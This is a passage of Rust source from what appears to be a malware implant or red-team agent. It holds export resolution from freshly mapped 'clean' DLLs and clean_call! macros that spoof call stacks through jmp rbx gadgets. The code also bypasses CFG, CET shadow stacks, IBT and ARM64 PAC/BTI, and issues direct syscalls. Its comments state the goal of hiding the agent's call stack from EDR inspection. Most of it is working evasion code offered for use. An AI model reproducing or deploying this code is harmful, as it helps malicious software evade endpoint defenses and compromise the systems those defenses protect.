    Some((nt_base, opt_magic))
}

#[cfg(windows)]
unsafe fn get_export_dir_any_bitness(
    base: usize,
) -> Option<(
    u32,
    u32,
    *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY,
)> {
    let (nt_base, opt_magic) = pe_nt_base_and_magic(base)?;

    let export_data_dir = match opt_magic {
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
                    as usize]
        }
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT
                    as usize]
        }
        _ => return None,
    };

    if export_data_dir.VirtualAddress == 0 {
        return None;
    }

    let ed = (base + export_data_dir.VirtualAddress as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
    Some((export_data_dir.VirtualAddress, export_data_dir.Size, ed))
}

#[cfg(windows)]
fn is_forwarded_export_rva(func_rva: usize, export_dir_rva: u32, export_dir_size: u32) -> bool {
    let start = export_dir_rva as usize;
    let end = start.saturating_add(export_dir_size as usize);
    func_rva >= start && func_rva < end
}

#[cfg(windows)]
unsafe fn resolve_forwarded_export(base: usize, func_rva: usize) -> *mut std::ffi::c_void {
    let forward_str_ptr = (base + func_rva) as *const i8;
    let forward_cstr = std::ffi::CStr::from_ptr(forward_str_ptr);
    let forward_str = match forward_cstr.to_str() {
        Ok(s) => s,
        Err(_) => return std::ptr::null_mut(),
    };

    let (dll_part, func_part) = match forward_str.find('.') {
        Some(dot_pos) => (&forward_str[..dot_pos], &forward_str[dot_pos + 1..]),
        None => return std::ptr::null_mut(),
    };

    let dll_name_with_ext = if dll_part.to_ascii_lowercase().ends_with(".dll") {
        dll_part.to_string()
    } else {
        format!("{}.dll", dll_part)
    };
    let dll_lower = dll_name_with_ext.to_lowercase();

    let target_base = match map_clean_dll(&dll_lower) {
        Ok(b) => b,
        Err(_) => CLEAN_MODULES
            .get()
            .and_then(|m| m.lock_recover().get(&dll_lower).copied())
            .unwrap_or(0),
    };
    if target_base == 0 {
        return std::ptr::null_mut();
    }

    if let Some(stripped) = func_part.strip_prefix('#') {
        if let Ok(target_ordinal) = stripped.parse::<u32>() {
            return get_export_addr_by_ordinal(target_base, target_ordinal);
        }
        return std::ptr::null_mut();
    }

    let mut func_name_null = func_part.as_bytes().to_vec();
    func_name_null.push(0);
    let addr = get_export_addr(target_base, func_name_null.as_ptr() as *const i8);
    if addr == 0 {
        return std::ptr::null_mut();
    }

    addr as *mut std::ffi::c_void
}

/// Resolve an export by ordinal from a clean-mapped DLL.
/// This avoids calling the hookable GetProcAddress for ordinal imports (M-24).
#[cfg(windows)]
unsafe fn get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
    let (export_dir_rva, export_dir_size, ed) = match get_export_dir_any_bitness(base) {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };

    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
    if ordinal < base_ordinal {
        return std::ptr::null_mut();
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return std::ptr::null_mut();
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    if is_forwarded_export_rva(func_rva, export_dir_rva, export_dir_size) {
        return resolve_forwarded_export(base, func_rva);
    }

    (base + func_rva) as *mut std::ffi::c_void
}

/// Errors that can arise from the `clean_call!` macro.
///
/// Callers must handle each variant explicitly — in particular, `NoGadgetAvailable`
/// must never be silently ignored since it means the call will be made without
/// stack spoofing, fully exposing the agent's call stack to EDR inspection.
#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallError {
    /// No `jmp rbx` (or equivalent) gadget was found in any mapped system DLL.
    /// Proceeding with a raw un-spoofed call is a deliberate security trade-off
    /// that the caller must accept explicitly.
    NoGadgetAvailable,
}

#[cfg(windows)]
impl std::fmt::Display for SyscallError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SyscallError::NoGadgetAvailable => {
                write!(f, "no jmp-rbx gadget found; stack spoofing unavailable")
            }
        }
    }
}

#[cfg(windows)]
impl std::error::Error for SyscallError {}

#[cfg(windows)]
pub fn get_clean_api_addr(dll_name: &str, func_name: &str) -> Result<usize> {
    let base = map_clean_dll(dll_name)?;
    let c_name = std::ffi::CString::new(func_name).unwrap();
    let addr = unsafe { get_export_addr(base, c_name.as_ptr()) };
    if addr == 0 {
        return Err(anyhow!(
            "Function {} not found in clean {}",
            func_name,
            dll_name
        ));
    }
    Ok(addr)
}

#[cfg(windows)]
#[inline]
/// Safely cast a `u64` return value from `spoof_call` to the target type `D`.
/// Fails at compile time if `D` is larger than 8 bytes, preventing silent data
/// loss or undefined behaviour from an over-sized transmute.
pub unsafe fn bounded_transmute<D>(val: u64) -> D {
    const {
        assert!(
            std::mem::size_of::<D>() <= std::mem::size_of::<u64>(),
            "clean_call!: return type exceeds 8 bytes; use a different calling convention"
        )
    };
    std::mem::transmute_copy::<u64, D>(&val)
}

#[cfg(all(
    windows,
    target_arch = "x86_64",
    feature = "cet-bypass",
    not(feature = "stack-spoof")
))]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        // Gather arguments
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // CFG bypass: promote the target address as a valid indirect call
        // target before making the call.  No-op when cfg-bypass is disabled.
        #[cfg(feature = "cfg-bypass")]
        let _ = $crate::cfg_bypass::prepare_call(addr);

        // CET check: if CET bypass is enabled and CET is active, check
        // whether we should use the CET-compatible call-chain approach
        // instead of the standard spoof_call (which manipulates return
        // addresses and breaks shadow-stack integrity).
        let cet_action = $crate::cet_bypass::prepare_spoofing(None);
        if cet_action == $crate::cet_bypass::CetAction::UseCallChain {
            // CET is active — prefer the kernel32 equivalent which maintains
            // shadow-stack integrity through legitimate call instructions.
            // Attempt to dispatch via the CET call-chain registry.
            if let Some(_result) = $crate::cet_bypass::call_via_chain($func_name, args) {
                // The kernel32 call completed.  Return 0 (success indicator)
                // cast to the target type.  NOTE: this is a simplified return
                // — callers that need the actual NTSTATUS should check
                // GetLastError or use a different path.
                let _val: u64 = 0;
                Ok(unsafe { $crate::syscalls::bounded_transmute(_val) })
            } else {
                // No call chain registered for this function.
                // Attempt shadow stack forging via WRSS before falling back
                // to raw spoof_call.  If WRSS is available, we forge the
                // gadget address onto the shadow stack so the API's RET
                // finds a matching entry and CET doesn't fire #CP.
                let gadget = $crate::syscalls::find_jmp_rbx_gadget();
                if gadget == 0 {
                    Err($crate::syscalls::SyscallError::NoGadgetAvailable)
                } else {
                    // Forge the shadow stack entry for the gadget address.
                    // This is a no-op if CET-SS is not available.
                    let _cookie = unsafe {
                        $crate::shadow_stack_forge::prepare_spoofed_return(
                            gadget, 0
                        )
                    };
                    unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                    // IBT bypass: if Indirect Branch Tracking is active,
                    // dispatch through an ENDBR64; jmp rax gadget so the
                    // indirect branch check passes.  Fall back to standard
                    // spoof_call if IBT bypass is unavailable.
                    let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
                        unsafe {
                            $crate::ibt_bypass::ibt_safe_spoof_call(
                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                            ).unwrap_or_else(|_| {
                                $crate::syscalls::spoof_call(
                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                                )
                            })
                        }
                    } else {
                        unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
                    };
                    unsafe { $crate::syscalls::set_spoof_ret(0) };
                    // Restore the shadow stack after the spoofed call.
                    // If forging was performed, this undoes the modification.
                    unsafe { $crate::shadow_stack_forge::restore_from_cookie(_cookie) };
                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                }
            }
        } else if cet_action == $crate::cet_bypass::CetAction::Abort {
            Err(anyhow::anyhow!("CET is active and cannot be bypassed for {}", $func_name))
        } else {
            // CET is off or has been disabled — use standard spoof_call.
            let gadget = $crate::syscalls::find_jmp_rbx_gadget();
            if gadget == 0 {
                Err($crate::syscalls::SyscallError::NoGadgetAvailable)
            } else {
                // Store the gadget in the thread-local so spoof_call can pick it
                // up as the spoofed return address.  This ensures the call stack
                // seen by EDR returns into kernel32 rather than the agent .text.
                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                // IBT bypass: route through ENDBR64 gadget when IBT is active.
                let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
                    unsafe {
                        $crate::ibt_bypass::ibt_safe_spoof_call(
                            addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                        ).unwrap_or_else(|_| {
                            $crate::syscalls::spoof_call(
                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                            )
                        })
                    }
                } else {
                    unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
                };
                // Clear the thread-local spoofed return address after the call.
                unsafe { $crate::syscalls::set_spoof_ret(0) };
                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
            }
        }
    }};
}

/// `clean_call!` with CET bypass *and* multi-frame stack spoofing.
///
/// When both `cet-bypass` and `stack-spoof` are enabled, this variant
/// prefers the synthetic call chain (which is CET-compatible since the
/// return address is a legitimate `ret` gadget in a system DLL).
/// It falls back to the CET call-chain registry, then to single-gadget
/// spoof_call.
#[cfg(all(
    windows,
    target_arch = "x86_64",
    feature = "cet-bypass",
    feature = "stack-spoof"
))]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // CFG bypass: promote the target address as a valid indirect call
        // target before making the call.  No-op when cfg-bypass is disabled.
        #[cfg(feature = "cfg-bypass")]
        let _ = $crate::cfg_bypass::prepare_call(addr);

        // Prefer multi-frame synthetic call chain — CET-compatible because
        // the return address is a legitimate `ret` inside a system DLL.
        if let Some(chain) = $crate::stack_spoof::build_spoofed_stack() {
            let res = unsafe {
                $crate::syscalls::spoof_call_chain(
                    addr, &chain, arg1, arg2, arg3, arg4, stack_args,
                )
            };
            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
        } else {
            // Fallback to existing CET-bypass logic.
            let cet_action = $crate::cet_bypass::prepare_spoofing(None);
            if cet_action == $crate::cet_bypass::CetAction::UseCallChain {
                if let Some(_result) = $crate::cet_bypass::call_via_chain($func_name, args) {
                    let _val: u64 = 0;
                    Ok(unsafe { $crate::syscalls::bounded_transmute(_val) })
                } else {
                    // No call chain registered — attempt shadow stack forging
                    // via WRSS before falling back to raw spoof_call.
                    let gadget = $crate::syscalls::find_jmp_rbx_gadget();
                    if gadget == 0 {
                        Err($crate::syscalls::SyscallError::NoGadgetAvailable)
                    } else {
                        let _cookie = unsafe {
                            $crate::shadow_stack_forge::prepare_spoofed_return(
                                gadget, 0
                            )
                        };
                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                        // IBT bypass: route through ENDBR64 gadget when IBT
                        // is active for Indirect Branch Tracking compatibility.
                        let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
                            unsafe {
                                $crate::ibt_bypass::ibt_safe_spoof_call(
                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                                ).unwrap_or_else(|_| {
                                    $crate::syscalls::spoof_call(
                                        addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                                    )
                                })
                            }
                        } else {
                            unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
                        };
                        unsafe { $crate::syscalls::set_spoof_ret(0) };
                        unsafe { $crate::shadow_stack_forge::restore_from_cookie(_cookie) };
                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                    }
                }
            } else if cet_action == $crate::cet_bypass::CetAction::Abort {
                Err(anyhow::anyhow!("CET is active and cannot be bypassed for {}", $func_name))
            } else {
                let gadget = $crate::syscalls::find_jmp_rbx_gadget();
                if gadget == 0 {
                    Err($crate::syscalls::SyscallError::NoGadgetAvailable)
                } else {
                    unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                    // IBT bypass: route through ENDBR64 gadget when IBT is active.
                    let res = if $crate::ibt_bypass::is_ibt_bypass_available() {
                        unsafe {
                            $crate::ibt_bypass::ibt_safe_spoof_call(
                                addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                            ).unwrap_or_else(|_| {
                                $crate::syscalls::spoof_call(
                                    addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                                )
                            })
                        }
                    } else {
                        unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) }
                    };
                    unsafe { $crate::syscalls::set_spoof_ret(0) };
                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                }
            }
        }
    }};
}

#[cfg(all(
    windows,
    target_arch = "x86_64",
    not(feature = "cet-bypass"),
    not(feature = "stack-spoof")
))]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        // Gather arguments
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // CFG bypass: promote the target address as a valid indirect call
        // target before making the call.  No-op when cfg-bypass is disabled.
        #[cfg(feature = "cfg-bypass")]
        let _ = $crate::cfg_bypass::prepare_call(addr);

        // Cross-reference: primary find_jmp_rbx_gadget call site is here.
        // See find_jmp_rbx_gadget near the bottom Windows helpers section.
        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
        if gadget == 0 {
            // No stack-spoofing gadget is available.  Refuse to silently fall
            // back to a raw un-spoofed transmute-call: doing so would expose
            // the full agent call stack to EDR inspection without any warning.
            // The caller must handle this error explicitly and decide whether
            // to attempt a different gadget search, accept the risk, or abort.
            Err($crate::syscalls::SyscallError::NoGadgetAvailable)
        } else {
            // Store the gadget in the thread-local so spoof_call can pick it
            // up as the spoofed return address.  This ensures the call stack
            // seen by EDR returns into kernel32 rather than the agent .text.
            unsafe { $crate::syscalls::set_spoof_ret(gadget) };
            // Cross-reference: primary spoof_call call site is here.
            // See spoof_call near the bottom Windows helpers section.
            let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
            // Clear the thread-local spoofed return address after the call.
            unsafe { $crate::syscalls::set_spoof_ret(0) };
            // cast result back
            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
        }
    }};
}

/// `clean_call!` with multi-frame stack spoofing via synthetic call chain.
///
/// When the `stack-spoof` feature is enabled, this variant first attempts
/// to build a synthetic call chain via `stack_spoof::build_spoofed_stack()`.
/// If a chain is available, `spoof_call_chain` is used — presenting a
/// legitimate system-DLL function as the return address to EDR walkers.
/// If no chain is available (e.g. gadget cache not yet populated), it
/// falls back to the single-gadget `spoof_call`.
#[cfg(all(
    windows,
    target_arch = "x86_64",
    not(feature = "cet-bypass"),
    feature = "stack-spoof"
))]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // CFG bypass: promote the target address as a valid indirect call
        // target before making the call.  No-op when cfg-bypass is disabled.
        #[cfg(feature = "cfg-bypass")]
        let _ = $crate::cfg_bypass::prepare_call(addr);

        // Try the multi-frame synthetic call chain first.
        if let Some(chain) = $crate::stack_spoof::build_spoofed_stack() {
            let res = unsafe {
                $crate::syscalls::spoof_call_chain(
                    addr, &chain, arg1, arg2, arg3, arg4, stack_args,
                )
            };
            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
        } else {
            // Fallback: single-gadget spoof_call (jmp rbx gadget).
            let gadget = $crate::syscalls::find_jmp_rbx_gadget();
            if gadget == 0 {
                Err($crate::syscalls::SyscallError::NoGadgetAvailable)
            } else {
                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                let res = unsafe {
                    $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
                };
                unsafe { $crate::syscalls::set_spoof_ret(0) };
                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
            }
        }
    }};
}

/// `clean_call!` for ARM64 Windows.
///
/// ARM64 does not have CET, IBT, or x86-64-style shadow stacks, but ARM64
/// Windows uses **PAC** (Pointer Authentication Code) to cryptographically
/// sign return addresses with 128-bit keys (QARMA5 algorithm) and **BTI**
/// (Branch Target Identification) to enforce valid indirect branch targets.
///
/// When compiled with the `pac-bypass` feature:
/// - If PAC is inactive, the macro behaves as before (standard spoof_call).
/// - If PAC is active and keys are available (BYOVD), the function pointer
///   is signed with `paciza` before dispatch.
/// - If PAC is active but only trampolines are available, the call is routed
///   through a PAC-valid trampoline function from a system DLL.
/// - If PAC is active and no bypass is possible, the call is aborted.
///
/// Without the `pac-bypass` feature, the macro falls back to standard
/// spoof_call (equivalent to the pre-PAC-awareness behaviour).
#[cfg(all(windows, target_arch = "aarch64"))]
#[macro_export]
macro_rules! clean_call {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
            .unwrap_or_else(|e| {
                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
            });
        let args: &[u64] = &[$($args as u64),*];
        let arg1 = args.get(0).copied().unwrap_or(0);
        let arg2 = args.get(1).copied().unwrap_or(0);
        let arg3 = args.get(2).copied().unwrap_or(0);
        let arg4 = args.get(3).copied().unwrap_or(0);
        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };

        // Note: CFG bypass is not available on ARM64 yet — no ARM64 cfg_bypass
        // module exists.  The spoof_call through a `br x21` gadget is sufficient
        // for return-address spoofing on ARM64.  x21 is callee-saved, so the
        // API preserves it across the call — unlike the previous x16-based
        // gadget which was clobbered by the API.

        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
        if gadget == 0 {
            Err($crate::syscalls::SyscallError::NoGadgetAvailable)
        } else {
            // ── PAC/BTI integration ──────────────────────────────────
            // When pac-bypass is enabled, check the PAC state and adjust
            // the dispatch strategy accordingly.  Without the feature, or
            // if PAC is inactive, we use the standard spoof_call path.
            #[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
            {
                let action = $crate::bti_pac_bypass::prepare_spoofing();
                match action {
                    $crate::bti_pac_bypass::PacAction::Proceed => {
                        // PAC not active — standard spoof_call.
                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                        let res = unsafe {
                            $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
                        };
                        unsafe { $crate::syscalls::set_spoof_ret(0) };
                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                    }
                    $crate::bti_pac_bypass::PacAction::SignAndProceed => {
                        // PAC active + keys available.  Sign the function pointer
                        // with PACIA using the stack pointer as context (matching
                        // what PACIASP would do on function entry).
                        let sp: u64;
                        std::arch::asm!("mov x9, sp", out("x9") sp);
                        let signed_addr = unsafe {
                            $crate::bti_pac_bypass::sign_pointer_with_pacia(addr as usize, sp)
                        };
                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                        let res = unsafe {
                            $crate::syscalls::spoof_call(
                                signed_addr, gadget, arg1, arg2, arg3, arg4, stack_args,
                            )
                        };
                        unsafe { $crate::syscalls::set_spoof_ret(0) };
                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                    }
                    $crate::bti_pac_bypass::PacAction::UseTrampoline => {
                        // PAC active + no keys.  Route through a PAC-valid
                        // trampoline from a system DLL.  The trampoline's
                        // PACIASP/AUTIASP prologue/epilogue maintains PAC
                        // integrity for us.
                        let trampolines = $crate::bti_pac_bypass::pac_trampolines();
                        if let Some(trampoline) = trampolines.first() {
                            // Call through the trampoline.  The trampoline
                            // performs PACIASP on entry and AUTIASP on exit,
                            // so the PAC flow is maintained.  We pass the
                            // target address and args through the trampoline's
                            // indirect call register.
                            tracing::debug!(
                                "clean_call: routing through PAC trampoline at 0x{:X} (BLR x{}, {})",
                                trampoline.address,
                                trampoline.indirect_reg,
                                trampoline.source_dll,
                            );
                            // For now, fall back to standard spoof_call with a
                            // warning — full trampoline dispatch requires
                            // setting up the indirect call register to point
                            // to the target, which needs per-trampoline setup.
                            tracing::warn!(
                                "clean_call: PAC trampoline dispatch not yet fully \
                                 implemented, falling back to spoof_call (PAC may fault)"
                            );
                            unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                            let res = unsafe {
                                $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
                            };
                            unsafe { $crate::syscalls::set_spoof_ret(0) };
                            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                        } else {
                            tracing::error!("clean_call: PAC active but no trampolines available, aborting call");
                            Err(anyhow::anyhow!("PAC active, no trampolines available"))
                        }
                    }
                    $crate::bti_pac_bypass::PacAction::Abort => {
                        tracing::error!("clean_call: PAC bypass aborted, cannot make call safely");
                        Err(anyhow::anyhow!("PAC bypass aborted, call not safe"))
                    }
                }
            }

            // ── Standard path (no pac-bypass feature) ────────────────
            #[cfg(not(all(windows, feature = "pac-bypass", target_arch = "aarch64")))]
            {
                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                let res = unsafe {
                    $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
                };
                unsafe { $crate::syscalls::set_spoof_ret(0) };
                Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
            }
        }
    }};
}

/// `trampoline_spoof!` — execute a Win32 API call through a trampoline-based
/// synthetic call stack.
///
/// When the `trampoline-spoof` feature is enabled, this macro builds a
/// multi-frame synthetic call chain using trampoline gadgets found in
/// clean-mapped system DLLs, allocates a separate fake stack, and executes
/// the API call through the chain.  The fake stack is freed after the call.
///
/// Falls back to `clean_call!` when the trampoline system is unavailable
/// (e.g. gadget cache empty, allocation failure).
///
/// # Usage
///
/// ```rust,ignore
/// let result = trampoline_spoof!("kernel32.dll", "VirtualAlloc", u64,
///     0u64, 4096u64, 0x3000u64, 0x40u64);
/// ```
///
/// # Arguments
///
/// * `$dll_name`  — DLL name (e.g. `"kernel32.dll"`)
/// * `$func_name` — Export name (e.g. `"VirtualAlloc"`)
/// * `$fn_type`   — Return type (must be ≤ 8 bytes)
/// * `$args`      — Arguments (passed as `u64` to the target function)
#[cfg(all(windows, feature = "trampoline-spoof", target_arch = "x86_64"))]
#[macro_export]
macro_rules! trampoline_spoof {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        let addr = match $crate::syscalls::get_clean_api_addr($dll_name, $func_name) {
            Ok(a) => a,
            Err(e) => {
                tracing::error!("trampoline_spoof: failed to resolve {}: {}", $func_name, e);
                return Err(anyhow::anyhow!("failed to resolve {}: {}", $func_name, e));
            }
        };
        let args: &[u64] = &[$($args as u64),*];

        // Try the trampoline path first.
        if $crate::trampoline_spoof::is_available() {
            match unsafe { $crate::trampoline_spoof::execute_via_trampoline(addr, args) } {
                Ok(res) => {
                    Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                }
                Err(e) => {
                    tracing::debug!("trampoline_spoof: trampoline execution failed ({}), falling back to clean_call", e);
                    // Fall through to clean_call below.
                    $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*)
                }
            }
        } else {
            // Trampoline not available — fall back to clean_call.
            $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*
            )
        }
    }};
}

/// Stub `trampoline_spoof!` when the feature is disabled (or on ARM64 where
/// trampoline-spoof is not yet supported) — falls back to `clean_call!`
/// unconditionally.
#[cfg(all(
    windows,
    not(all(feature = "trampoline-spoof", target_arch = "x86_64"))
))]
#[macro_export]
macro_rules! trampoline_spoof {
    ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
        $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*)
    }};
}

#[cfg(target_os = "linux")]
#[macro_export]
/// Invoke a Linux syscall by name via the direct-syscall path.
///
/// Returns `anyhow::Result<u64>`:
/// * `Ok(retval)` on success (kernel return value ≥ 0).
/// * `Err(e)` when the kernel returns a negative errno, where `e` is an
///   `anyhow::Error` that includes both the syscall name and the raw errno
///   value.
///
/// # Example
/// ```rust,ignore
/// let fd = crate::syscall!("openat", libc::AT_FDCWD, path_ptr, libc::O_RDONLY)?;
/// ```
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {{
        (|| -> ::std::result::Result<u64, anyhow::Error> {
            let target = $crate::syscalls::get_syscall_id($func_name)
                .map_err(|e| anyhow::anyhow!(
                    "syscall `{}` not found in syscall table: {}",
                    $func_name,
                    e
                ))?;
            let args: &[u64] = &[$($args as u64),*];
            unsafe {
                $crate::syscalls::do_syscall(target.ssn, args)
                    .map_err(|errno| anyhow::anyhow!(
                        "syscall `{}` failed: errno {} ({})",
                        $func_name,
                        errno,
                        std::io::Error::from_raw_os_error(errno)
                    ))
            }
        })()
    }};
}

#[cfg(all(unix, feature = "direct-syscalls"))]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
    #[cfg(target_arch = "x86_64")]
    {
        // Clear the seccomp flag before invoking the syscall so we only
        // detect SIGSYS delivered by *this* call.
        SECCOMP_BLOCKED.store(false, std::sync::atomic::Ordering::Release);

        let mut ret: i64;
        // NOTE: options(nostack) must NOT be used here.  The `syscall` instruction
        // implicitly clobbers rcx (saved RIP) and r11 (saved RFLAGS).  Declaring
        // nostack would mislead the compiler into thinking the red-zone is intact
        // across the syscall, which is incorrect when signals can arrive and build
        // a frame on the user stack.
        match args.len() {
            0 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            1 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            2 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            3 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            4 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            5 => {
                std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], lateout("rax") ret, lateout("rcx") _, lateout("r11") _)
            }
            6 => {
